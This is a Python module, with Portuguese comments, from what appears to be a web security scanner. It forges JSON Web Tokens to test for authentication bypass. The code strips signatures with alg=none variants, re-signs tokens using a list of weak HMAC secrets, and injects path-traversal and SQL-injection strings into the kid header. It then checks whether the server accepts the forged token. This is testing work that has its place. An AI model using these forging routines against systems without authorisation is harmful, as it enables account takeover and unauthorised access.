"""
core/jwt.py
===========

Ataques a JSON Web Token. Localiza um JWT na requisição (header Authorization,
cookies ou parâmetros) e testa:
  - alg=none / None / NONE (assinatura removida)
  - segredo HMAC fraco (lista curta de segredos comuns)
  - kid injection (path traversal / SQLi no header kid)

Detecção: forja o token, reenvia e verifica se foi ACEITO (resposta parecida
com a do token válido, e diferente da de um token inválido).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from typing import Optional, List

from .http_client import HttpClient
from .target import RequestTemplate, PreparedRequest, InjectionPoint
from . import detector as det

_JWT_RX = re.compile(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*")

WEAK_SECRETS = ["secret", "password", "123456", "key", "jwt", "changeme", "admin",
                "your-256-bit-secret", "s3cr3t", "supersecret", "private", "token",
                "test", "qwerty", "0000", "secretkey", "jwtsecret"]


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode(token: str):
    parts = token.split(".")
    if len(parts) < 2:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload, (parts[2] if len(parts) > 2 else "")
    except Exception:
        return None


def _encode(header: dict, payload: dict, sig: str = "") -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{sig}"


def forge_none(header: dict, payload: dict, variant: str = "none") -> str:
    h = dict(header); h["alg"] = variant
    return _encode(h, payload, "")


def sign_hs256(header: dict, payload: dict, secret: str) -> str:
    h = dict(header); h["alg"] = "HS256"
    signing = f"{_b64url_encode(json.dumps(h,separators=(',',':')).encode())}." \
              f"{_b64url_encode(json.dumps(payload,separators=(',',':')).encode())}"
    sig = hmac.new(secret.encode(), signing.encode(), hashlib.sha256).digest()
    return f"{signing}.{_b64url_encode(sig)}"


def forge_kid(header: dict, payload: dict, kid_val: str, secret: str = "") -> str:
    h = dict(header); h["kid"] = kid_val; h["alg"] = "HS256"
    return sign_hs256(header={**h}, payload=payload, secret=secret)


def find_jwts(template: RequestTemplate):
    """Localiza JWTs na requisição. Retorna [(local, chave, token)]."""
    found = []
    for k, v in (template.headers or {}).items():
        for m in _JWT_RX.finditer(str(v)):
            found.append(("header", k, m.group(0)))
    for k, v in (template.cookies or {}).items():
        for m in _JWT_RX.finditer(str(v)):
            found.append(("cookie", k, m.group(0)))
    for k, v in (template.query or {}).items():
        for m in _JWT_RX.finditer(str(v)):
            found.append(("query", k, m.group(0)))
    return found


class JWTScanner:
    def __init__(self, client: HttpClient, on_finding=None):
        self.client = client
        self.on_finding = on_finding

    def _swap(self, template: RequestTemplate, loc: str, key: str, old: str, new: str) -> PreparedRequest:
        import copy
        t = copy.deepcopy(template)
        if loc == "header":
            t.headers[key] = str(t.headers.get(key, "")).replace(old, new)
        elif loc == "cookie":
            t.cookies[key] = str(t.cookies.get(key, "")).replace(old, new)
        elif loc == "query":
            t.query[key] = str(t.query.get(key, "")).replace(old, new)
        return t.baseline()

    async def scan(self, template: RequestTemplate, scope) -> List:
        out = []
        jwts = find_jwts(template)
        if not jwts:
            return out
        base = template.baseline()
        if not scope.allows(base.url):
            return out
        valid_resp = await self.client.send(base)             # token original (válido)
        # token claramente inválido -> resposta de rejeição
        loc, key, tok = jwts[0]
        rej = await self.client.send(self._swap(template, loc, key, tok, tok[:-3] + "xxx"))
        dec = decode(tok)
        if not dec:
            return out
        header, payload, _sig = dec

        def accepted(resp):
            # aceito = parecido com o válido E diferente da rejeição
            return (resp.ok and resp.status == valid_resp.status
                    and det._similarity(resp.text, valid_resp.text) >= 0.9
                    and det._similarity(resp.text, rej.text) < 0.95)

        async def report(name, forged, evidence):
            resp = await self.client.send(self._swap(template, loc, key, tok, forged))
            if accepted(resp):
                from modules.base import Finding
                f = Finding(module="jwt", point=f"{loc}:{key}", method=template.method,
                            url=base.url, payload=forged[:60] + "...", base_payload=f"jwt:{name}",
                            transform="raw", confidence=0.9, detectors=["jwt"],
                            evidence=evidence, tags=["jwt", name])
                out.append(f)
                if self.on_finding:
                    self.on_finding(f)
                return True
            return False

        # 1) alg=none (várias grafias)
        for v in ("none", "None", "NONE", "nOnE"):
            if await report(f"alg-{v}", forge_none(header, payload, v),
                            f"alg={v} aceito — assinatura não verificada"):
                break
        # 2) segredo HMAC fraco
        for sec in WEAK_SECRETS:
            if await report(f"weak-secret", sign_hs256(header, payload, sec),
                            f"assinado com segredo fraco '{sec}' e aceito"):
                break
        # 3) kid injection
        for kid in ("../../../../dev/null", "' OR '1'='1", "/dev/null"):
            if await report("kid-injection", forge_kid(header, payload, kid, ""),
                            f"kid injection aceito: {kid!r}"):
                break
        return out
